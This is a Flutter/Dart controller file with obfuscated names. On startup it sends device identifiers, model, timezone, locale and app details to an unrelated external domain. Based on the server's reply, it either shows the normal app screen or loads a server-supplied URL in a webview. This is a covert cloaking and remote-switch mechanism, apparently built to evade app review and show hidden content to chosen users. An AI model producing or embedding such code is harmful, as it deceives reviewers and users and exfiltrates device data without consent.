import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkStatus() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/systemError");
  }
}

class PageLogic extends GetxController {

  var ulxhgbqz = RxBool(false);
  var ehjtoyxfv = RxBool(true);
  var mvkgcbr = RxString("");
  var tito = RxBool(false);
  var watsica = RxBool(true);
  final qackjl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkStatus();
    super.onInit();
    dxuz();
  }


  Future<void> dxuz() async {

    tito.value = true;
    watsica.value = true;
    ehjtoyxfv.value = false;

    qackjl.post("https://ds.h3r3zian.club/kfdvcaiymwzrsputjbe",data: await xsylpbtzuo()).then((value) {
      var ogexs = value.data["ogexs"] as String;
      var qchkavul = value.data["qchkavul"] as bool;
      if (qchkavul) {
        mvkgcbr.value = ogexs;
        bette();
      } else {
        heidenreich();
      }
    }).catchError((e) {
      ehjtoyxfv.value = true;
      watsica.value = true;
      tito.value = false;
    });
  }

  Future<Map<String, dynamic>> xsylpbtzuo() async {
    final DeviceInfoPlugin nxwp = DeviceInfoPlugin();
    PackageInfo cdxmyqib_ikychget = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ukqawrls = Platform.localeName;
    var tix_xcuG = currentTimeZone;

    var tix_Vd = cdxmyqib_ikychget.packageName;
    var tix_qW = cdxmyqib_ikychget.version;
    var tix_YP = cdxmyqib_ikychget.buildNumber;

    var tix_tdRsKWrO = cdxmyqib_ikychget.appName;
    var tix_uNEOySVA = "";
    var tix_hMEtAou  = "";
    var tix_Bn = "";
    var sandrineBergstrom = "";
    var delphiaKessler = "";
    var rainaKassulke = "";
    var margareteSipes = "";
    var aimeeCrist = "";
    var hallieSchultz = "";


    var tix_IktUaYHG = "";
    var tix_TurjYqUf = false;

    if (GetPlatform.isAndroid) {
      tix_IktUaYHG = "android";
      var kqimth = await nxwp.androidInfo;

      tix_Bn = kqimth.brand;

      tix_uNEOySVA  = kqimth.model;
      tix_hMEtAou = kqimth.id;

      tix_TurjYqUf = kqimth.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tix_IktUaYHG = "ios";
      var wkuxsopv = await nxwp.iosInfo;
      tix_Bn = wkuxsopv.name;
      tix_uNEOySVA = wkuxsopv.model;

      tix_hMEtAou = wkuxsopv.identifierForVendor ?? "";
      tix_TurjYqUf  = wkuxsopv.isPhysicalDevice;
    }
    var res = {
      "tix_tdRsKWrO": tix_tdRsKWrO,
      "tix_qW": tix_qW,
      "tix_uNEOySVA": tix_uNEOySVA,
      "tix_xcuG": tix_xcuG,
      "sandrineBergstrom" : sandrineBergstrom,
      "tix_Bn": tix_Bn,
      "tix_hMEtAou": tix_hMEtAou,
      "aimeeCrist" : aimeeCrist,
      "delphiaKessler" : delphiaKessler,
      "ukqawrls": ukqawrls,
      "tix_YP": tix_YP,
      "tix_IktUaYHG": tix_IktUaYHG,
      "tix_TurjYqUf": tix_TurjYqUf,
      "rainaKassulke" : rainaKassulke,
      "tix_Vd": tix_Vd,
      "margareteSipes" : margareteSipes,
      "hallieSchultz" : hallieSchultz,

    };
    return res;
  }

  Future<void> heidenreich() async {
    Get.offAllNamed("/punchTab");
  }

  Future<void> bette() async {
    Get.offAllNamed("/punchInit");
  }

}
